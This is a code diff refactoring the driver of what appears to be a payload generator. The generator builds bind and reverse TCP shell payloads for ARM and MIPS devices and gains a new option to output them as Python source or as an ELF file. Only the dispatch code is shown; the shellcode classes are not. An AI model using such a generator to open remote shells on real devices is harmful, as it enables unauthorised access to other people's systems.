@@ -16,38 +16,44 @@ def main():
     parser.add_argument('--tech', help='Technique: bind, reverse', required=True)
     parser.add_argument('--ip', help='IP address for reverse shell (if technique is reverse)', required=False)
     parser.add_argument('--port', help='Port number for bind/reverse shell', required=False)
+    parser.add_argument('--out', help='Output format: elf, python', required=False)
 
     args = parser.parse_args()
 
-    if args.tech == 'bind':
-        if args.arch == 'armle':
-            content = armle_bind_tcp(args.port).generate_elf()
-        elif args.arch == 'mipsle':
-            content = mipsle_bind_tcp(args.port).generate_elf()
-        elif args.arch == 'mipsbe':
-            content = mipsbe_bind_tcp(args.port).generate_elf()
-
-    elif args.tech == 'reverse':
-        if args.arch == 'armle':
-            content = armle_reverse_tcp(args.ip, args.port).generate_elf()
-        elif args.arch == 'mipsle':
-            content = mipsle_reverse_tcp(args.ip, args.port).generate_elf()
-        elif args.arch == 'mipsbe':
-            content = mipsbe_reverse_tcp(args.ip, args.port).generate_elf()
+    if args.arch == 'armle':
+        if args.tech == 'bind':
+            payload = armle_bind_tcp(args.port)
+        elif args.tech == 'reverse':
+            payload = armle_reverse_tcp(args.ip, args.port)
+    elif args.arch == 'mipsle':
+        if args.tech == 'bind':
+            payload = mipsle_bind_tcp(args.port)
+        elif args.tech == 'reverse':
+            payload = mipsle_reverse_tcp(args.ip, args.port)
+    elif args.arch == 'mipsbe':
+        if args.tech == 'bind':
+            payload = mipsbe_bind_tcp(args.port)
+        elif args.tech == 'reverse':
+            payload = mipsbe_reverse_tcp(args.ip, args.port)
 
     print(("Architecture: {}\n"
            "IP: {}\n"
            "Port: {}\n"
            "-----------------").format(args.arch, args.ip, args.port))
 
-    path = "output/bd"
+    if args.out == 'python':
+        content = payload.generate_python()
+        print(content)
+    else:
+        content = payload.generate_elf()
+        path = "output/bd"
 
-    print(("Length: {}\n"
-           "Saving to: {}\n").format(len(content), path))
+        print(("Length: {}\n"
+               "Saving to: {}\n").format(len(content), path))
 
-    with open(path, 'wb+') as f:
-        f.write(content)
-        f.close()
+        with open(path, 'wb+') as f:
+            f.write(content)
+            f.close()
 
 
 if __name__ == '__main__':
